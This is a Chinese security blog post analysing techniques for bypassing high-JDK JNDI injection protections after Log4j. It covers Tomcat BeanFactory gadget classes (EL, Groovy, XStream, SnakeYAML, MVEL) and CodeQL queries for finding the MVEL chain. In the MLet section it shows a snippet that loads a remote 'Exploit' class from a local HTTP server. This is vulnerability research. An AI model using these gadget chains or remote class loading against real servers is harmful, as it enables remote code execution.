<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>JNDI高版本绕过浅析 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="JNDI高版本绕过浅析"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/links">Links</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>JNDI高版本绕过浅析</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2022/01/15/JNDI高版本绕过浅析/" rel="bookmark">
        <time class="entry-date published" datetime="2022-01-15T05:07:44.000Z">
          2022-01-15
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>​    最近<code>Log4j</code>的漏洞引起了很多师傅对JNDI注入漏洞利用的研究，<code>浅蓝</code>师傅的文章<a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">探索高版本 JDK 下 JNDI 漏洞的利用方法</a>提出了很多关于绕过JNDI高版本限制的方法，本文主要是对文章中的部分方法进行分析并加上一些我个人的思考。</p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        在分析这些具体的方法前，我们先对绕过的整体思路做一个阐述。目前高版本JDK的防护方式主要是针对加载远程的<code>ObjectFactory</code>的加载做限制，只有开启了某些属性后才会通过指定的远程地址获取<code>ObjectFactory</code>的Class并实例化，进而通过<code>ObjectFactory#getObjectInstance</code>来获取返回的真实对象。但是在加载远程地址获取<code>ObjectFactory</code>前，首先在本地<code>ClassPath</code>下加载指定的<code>ObjectFactory</code>，本地加载<code>ObjectFactory</code>失败后才会加载远程地址的<code>ObjectFactory</code>，所以一个主要的绕过思路就是加载本地ClassPath下的<code>ObjectFactory</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">     Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">     <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">     InstantiationException,</span></span><br><span class="line"><span class="function">     MalformedURLException </span>&#123;</span><br><span class="line">     Class&lt;?&gt; clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 首先加载当前环境下ClassPath下的ObjectFactory</span></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">          clas = helper.loadClass(factoryName);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">         <span class="comment">// ignore and continue</span></span><br><span class="line">         <span class="comment">// e.printStackTrace();</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">// 当前ClassPath加载失败才会加载classFactoryLocation中指定地址的ObjectFactory</span></span><br><span class="line">     String codebase;</span><br><span class="line">     <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">             (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">         &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>​        所以我们需要找到一个<code>javax.naming.spi.ObjectFactory</code>接口的实现类，在这个实现类的<code>getObjectInstance</code>可以实现一些恶意操作。但是在JDK提供的原生实现类里其实并没有操作空间。所以下面我们主要的思路就是在一些常用的框架或者组件中寻找可利用的ObjectFactory实现类。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220115205948693.png" alt="image-20220115205948693"></p>
<h2 id="常规绕过方式总结"><a href="#常规绕过方式总结" class="headerlink" title="常规绕过方式总结"></a>常规绕过方式总结</h2><p>​        Tomcat下的绕过比较精彩的并不是EL表达式利用，而是通过<code>BeanFactory#getObjectInstance</code>将这个漏洞的利用面从仅仅只能从<code>ObjectFactory</code>实现类的<code>getObjectInstance</code>方法利用扩展为一次可以调用”任意”类的”任意”方法的机会，但是对调用的类和方法以及参数有些限制。</p>
<ul>
<li>该类必须包含public无参构造方法</li>
<li>调用的方法必须是public方法</li>
<li>调用的方法只有一个参数并且参数类型为String类型</li>
</ul>
<p>所以下面我们只要找到某个类的某个方法既满足了上面的条件又实现我们想要的功能。</p>
<ul>
<li><code>javax.el.ELProcessor#eval</code>执行命令，但是<code>ELProcessor</code>是在Tomcat8才引入的。</li>
<li><code>groovy.lang.GroovyShell#evaluate(java.lang.String)</code>通过Groovy执行命令。</li>
<li><code>com.thoughtworks.xstream.XStream().fromXML(String)</code>通过调用<code>XStream</code>转换XML时的反序列化漏洞导致的RCE，这里之所以选择<code>XStream</code>是因为Xstream的反序列化漏洞和影响版本比较多。JSON的转换的漏洞相对来说通用性不高。</li>
<li><code>org.yaml.snakeyaml.Yaml#load(java.lang.String)</code>加载Yaml时的反序列化漏洞，在SpringBoot中经常会使用<code>snakeyaml</code>来进行yml配置文件的解析。</li>
<li><code>org.mvel2.MVEL#eval(String)</code>执行命令，这里<code>浅蓝</code>师傅文章中提到的是<code>MVEL</code>类是private所以要找上层调用，我在<code>2.0.17</code>中测试<code>Mvel</code>是存在public无参构造方法的，高版本确实换成了private构造方法。所以只能找那里调用了<code>Mvel#eval</code>方法，而<code>org.mvel2.sh.ShellSession#exec</code>调用了<code>Mvel#eval</code>，因此可以通过<code>ShellSession#exec</code>来间接完成调用。</li>
<li><code>com.sun.glass.utils.NativeLibLoader#loadLibrary(String)</code>加载DLL，前提是我们已经将构造好的DLL上传至目标上，所以局限性比较大。</li>
</ul>
<h2 id="CodeQL分析MVEL调用链挖掘过程"><a href="#CodeQL分析MVEL调用链挖掘过程" class="headerlink" title="CodeQL分析MVEL调用链挖掘过程"></a>CodeQL分析MVEL调用链挖掘过程</h2><p>上面这些利用方法原理理解都比较简单，但是作者怎么找到<code>org.mvel2.sh.ShellSession#exec</code>的过程我比较好奇，排除他已知这个方法可以调用外，我们可以思考一下作者如何找到这个方法的。要找到这个方法的思路其实比较简单，可以按照下面的思路。</p>
<ul>
<li>除了<code>org.mvel2.MVEL#eval(String)</code>可以执行命令其他重载的eval方法也可以执行命令</li>
<li>查找调用这些eval方法的调用，直到找到一个调用类存在public构造方法且间接调用eval的方法也是public类型并且参数为string类型</li>
</ul>
<p>但是如果手动找的话其实比较麻烦，因为调用eval方法的函数其实比较多，如下图所示。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220116203657942.png" alt="image-20220116203657942"></p>
<p>​    所以我想用CodeQL来帮我们做这件事情，由于MVEL是github上的开源项目，所以可以直接在<a target="_blank" rel="noopener" href="https://lgtm.com/projects/g/mvel/mvel/ci/">这里</a>下载到数据库。由于eval方法的第一个参数是要执行的表达式，所以我们将这个参数作为sink，source的名称我们不做限制，但是要限制方法的参数为string且只有一个参数，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@name</span> Tainttrack Context lookup</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MVEL</span> <span class="keyword">extends</span>  <span class="title">RefType</span></span>&#123;</span><br><span class="line">    MVEL()&#123;</span><br><span class="line">        <span class="keyword">this</span>.hasQualifiedName(<span class="string">&quot;org.mvel2&quot;</span>, <span class="string">&quot;MVEL&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//限制参数的类型和数量</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CallEval</span> <span class="keyword">extends</span>  <span class="title">Method</span> </span>&#123;</span><br><span class="line">    CallEval()&#123;</span><br><span class="line">        <span class="keyword">this</span>.getNumberOfParameters() = <span class="number">1</span> and <span class="keyword">this</span>.getParameter(<span class="number">0</span>).getType() <span class="keyword">instanceof</span> TypeString</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Parameter <span class="title">getAnUntrustedParameter</span><span class="params">()</span> </span>&#123; result = <span class="keyword">this</span>.getParameter(<span class="number">0</span>) &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//限制方法的名称和类型</span></span><br><span class="line"><span class="function">predicate <span class="title">isEval</span><span class="params">(Expr arg)</span> </span>&#123;</span><br><span class="line">    exists(MethodAccess ma |</span><br><span class="line">        ma.getMethod().getName()=<span class="string">&quot;eval&quot;</span></span><br><span class="line">        and</span><br><span class="line">        ma.getMethod().getDeclaringType() <span class="keyword">instanceof</span> MVEL</span><br><span class="line">        and</span><br><span class="line">        arg = ma.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TainttrackLookup</span>  <span class="keyword">extends</span> <span class="title">TaintTracking</span>::<span class="title">Configuration</span> </span>&#123;</span><br><span class="line">    TainttrackLookup() &#123; </span><br><span class="line">        <span class="keyword">this</span> = <span class="string">&quot;TainttrackLookup&quot;</span> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node source)</span> </span>&#123;</span><br><span class="line">        exists(CallEval evalMethod |</span><br><span class="line">            source.asParameter() = evalMethod.getAnUntrustedParameter())</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">override predicate <span class="title">isSink</span><span class="params">(DataFlow::Node sink)</span> </span>&#123;</span><br><span class="line">        exists(Expr arg |</span><br><span class="line">            isEval(arg)</span><br><span class="line">            and</span><br><span class="line">            sink.asExpr() = arg</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">from TainttrackLookup config , DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where</span><br><span class="line">    config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, <span class="string">&quot;unsafe lookup&quot;</span>, source.getNode(), <span class="string">&quot;this is user input&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    但是跑完以后去掉一些看上去有问题的链后并没有找到<code>浅蓝</code>师傅发现的那个调用链，只找到了下面的调用链，但是也是在<code>MVEL</code>类中的，所以也不能利用。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220116224209434.png" alt="image-20220116224209434"></p>
<p>​    下面分析下为什么没跑出来，首先看下我们设置的sink是否有问题，sink确实可以找到<code>PushContext#execute</code>方法，所以sink这里没有问题。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220116224434221.png" alt="image-20220116224434221"></p>
<p>​    再通过下面的代码检测source是否设置正确，也没有问题，所以说明在污点传播的过程中被打断了。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220116224950293.png" alt="image-20220116224950293"></p>
<p>​    经过分析，猜测可能打断污点传播的点有两处。</p>
<ul>
<li>exec方法直接将参数添加到<code>inBuffer</code>中并调用了无参构造方法，如果分析中认为调用无参构造方法就认为污点会被打断那么这里就会导致污点传播被打断</li>
</ul>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220116225744695.png" alt="image-20220116225744695"></p>
<ul>
<li>在<code>_exec</code>中通过<code>arraycopy</code>完成了<code>passParameters</code>的赋值操作，如果CodeQL这里没分析好也会导致污点传播被打断。</li>
</ul>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220116230023259.png" alt="image-20220116230023259"></p>
<p>首先分析第一种情况，在<code>_exec</code>中将<code>inBuffer</code>的值封装为<code>inTokens</code>后调用了<code>containsKey</code>方法，所以我们在不更改source的情况下将sink更改为对<code>containsKey</code>的调用。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220116231903405.png" alt="image-20220116231903405"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">predicate isEval(Expr arg) &#123;</span><br><span class="line">    exists(MethodAccess ma |</span><br><span class="line">        ma.getMethod().getName()=&quot;containsKey&quot;</span><br><span class="line">        and</span><br><span class="line">        arg = ma.getArgument(0)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    可以看到确实是可以从<code>ShellSession#exec</code>追踪到<code>commands.containsKey</code>中的，所以第一种假设就被推翻了。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220116233122933.png" alt="image-20220116233122933"></p>
<p>​    再来看第二种猜测，只要我们编写一个<code>isAdditionalTaintStep</code>将arraycopy的第1个参数和<code>execute</code>的第2个参数接起来即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node fromNode, DataFlow::Node toNode) &#123;</span><br><span class="line">    exists(MethodAccess ma,MethodAccess ma2 |</span><br><span class="line">        ma.getMethod().getDeclaringType().hasQualifiedName(&quot;java.lang&quot;, &quot;System&quot;) </span><br><span class="line">        and ma.getMethod().hasName(&quot;arraycopy&quot;) and fromNode.asExpr()=ma.getArgument(0) </span><br><span class="line">        and ma2.getMethod().getDeclaringType().hasQualifiedName(&quot;org.mvel2.sh&quot;, &quot;Command&quot;)  </span><br><span class="line">        and ma2.getMethod().hasName(&quot;execute&quot;) and toNode.asExpr()=ma2.getArgument(1)</span><br><span class="line">     )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​    最终就可以拿到<code>浅蓝</code>师傅发现的调用链。</p>
<p><img src="/2022/01/15/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20220116235728417.png" alt="image-20220116235728417"></p>
<h2 id="MLet利用方式分析"><a href="#MLet利用方式分析" class="headerlink" title="MLet利用方式分析"></a>MLet利用方式分析</h2><p>​    MLet是UrlClassLoader的子类，因此理论上可以通过loadClass加载远程地址的类进行利用，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MLet mLet = <span class="keyword">new</span> MLet();</span><br><span class="line">mLet.addURL(<span class="string">&quot;http://127.0.0.1:2333/&quot;</span>);</span><br><span class="line">mLet.loadClass(<span class="string">&quot;Exploit&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="失败的利用分析"><a href="#失败的利用分析" class="headerlink" title="失败的利用分析"></a>失败的利用分析</h3><p>​    虽然说loadClass在加载以后没有newInstance不能触发类的初始化操作，但是在BeanFactory中本身就会根据我们传入的名称来实例化对象，如果我们发送两次请求，第一次通过UrlClassLoader加载到内存，由于在loadClass加载的过程中有个缓存机制，如果已经加载过的类会直接返回，我们在第二次请求中直接让实例化这个类不就可以了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">      <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">          <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">          Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">          <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">              <span class="keyword">long</span> t0 = System.nanoTime();</span><br></pre></td></tr></table></figure>

<p>​    但实际是不行的，因为BeanFactory中获取到类名后是通过<code>Thread.currentThread().getContextClassLoader()</code>这个加载器来加载类的，而这个类加载器肯定不是<code>Mlet</code>那个加载器，所以它没有加载过我们创建的恶意类，自然也获取不到了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//从引用对象中获取类名</span></span><br><span class="line">                Reference ref = (Reference)obj;</span><br><span class="line">                String beanClassName = ref.getClassName();</span><br><span class="line">                Class&lt;?&gt; beanClass = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">//获取加载器加载类</span></span><br><span class="line">                ClassLoader tcl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (tcl != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var26) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = Class.forName(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var25) &#123;</span><br><span class="line">                        var25.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法多次调用分析"><a href="#方法多次调用分析" class="headerlink" title="方法多次调用分析"></a>方法多次调用分析</h3><p>​    那么Mlet为什么可以调用多个方法，因为按照我们前面的分析，只会调用一个方法。下面我们简要分析下<code>org.apache.naming.factory.BeanFactory#getObjectInstance</code>。</p>
<ul>
<li>从引用对象中获取类名并实例化，这里需要注意的是<strong>这个类只实例化了一次</strong>。再从forceString属性中获取内容并通过<code>,</code>分割转换为数组，遍历数组中的内容并根据<code>=</code>分割获取要调用的方法名获取method对象并保存到Map中。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="comment">//从引用对象中获取类名</span></span><br><span class="line">               Reference ref = (Reference)obj;</span><br><span class="line">               String beanClassName = ref.getClassName();</span><br><span class="line">               Class&lt;?&gt; beanClass = <span class="keyword">null</span>;</span><br><span class="line">               <span class="comment">//获取加载器加载类</span></span><br><span class="line">               ClassLoader tcl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">               <span class="keyword">if</span> (tcl != <span class="keyword">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">try</span> &#123;</span><br><span class="line">                       beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                   &#125; <span class="keyword">catch</span> (ClassNotFoundException var26) &#123;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">try</span> &#123;</span><br><span class="line">                       beanClass = Class.forName(beanClassName);</span><br><span class="line">                   &#125; <span class="keyword">catch</span> (ClassNotFoundException var25) &#123;</span><br><span class="line">                       var25.printStackTrace();</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">		<span class="comment">//加载失败抛出异常</span></span><br><span class="line">               <span class="keyword">if</span> (beanClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> NamingException(<span class="string">&quot;Class not found: &quot;</span> + beanClassName);</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   BeanInfo bi = Introspector.getBeanInfo(beanClass);</span><br><span class="line">                   PropertyDescriptor[] pda = bi.getPropertyDescriptors();</span><br><span class="line">                   <span class="comment">//获取class的对应的对象，只实例化了一次</span></span><br><span class="line">                   Object bean = beanClass.getConstructor().newInstance();</span><br><span class="line">                   <span class="comment">//从forceString中获取引用属性</span></span><br><span class="line">                   RefAddr ra = ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">                   Map&lt;String, Method&gt; forced = <span class="keyword">new</span> HashMap();</span><br><span class="line">                   String value;</span><br><span class="line">                   String propName;</span><br><span class="line">                   <span class="keyword">int</span> i;</span><br><span class="line">                   <span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">                       <span class="comment">//获取forceString的内容并通过`,`分割</span></span><br><span class="line">                       value = (String)ra.getContent();</span><br><span class="line">                       <span class="comment">//paramTypes为String类型</span></span><br><span class="line">                       Class&lt;?&gt;[] paramTypes = <span class="keyword">new</span> Class[]&#123;String.class&#125;;</span><br><span class="line">                       String[] var18 = value.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                       i = var18.length;</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">for</span>(<span class="keyword">int</span> var20 = <span class="number">0</span>; var20 &lt; i; ++var20) &#123;</span><br><span class="line">                           String param = var18[var20];</span><br><span class="line">                           param = param.trim();</span><br><span class="line">                           <span class="comment">//根据等号分割获取propName和param,如果没有等号则转成setter方法</span></span><br><span class="line">                           <span class="keyword">int</span> index = param.indexOf(<span class="number">61</span>);</span><br><span class="line">                           <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                               propName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">                               param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">                           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                               propName = <span class="string">&quot;set&quot;</span> + param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + param.substring(<span class="number">1</span>);</span><br><span class="line">                           &#125;</span><br><span class="line">					<span class="comment">//通过propName和paramTypes获取Method并放到param中</span></span><br><span class="line">                           <span class="keyword">try</span> &#123;</span><br><span class="line">                               forced.put( , beanClass.getMethod(propName, paramTypes));</span><br><span class="line">                           &#125; <span class="keyword">catch</span> (SecurityException | NoSuchMethodException var24) &#123;</span><br><span class="line">                               <span class="keyword">throw</span> <span class="keyword">new</span> NamingException(<span class="string">&quot;Forced String setter &quot;</span> + propName + <span class="string">&quot; not found for property &quot;</span> + param);</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>下面获取引用对象中保存的所有属性，通过while循环遍历属性内容并赋值给valueArray作为参数最终通过invoke完成反射调用。这里需要注意的是<strong>反射调用是在while循环中的，所以可以调用多个方法</strong>。</li>
</ul>
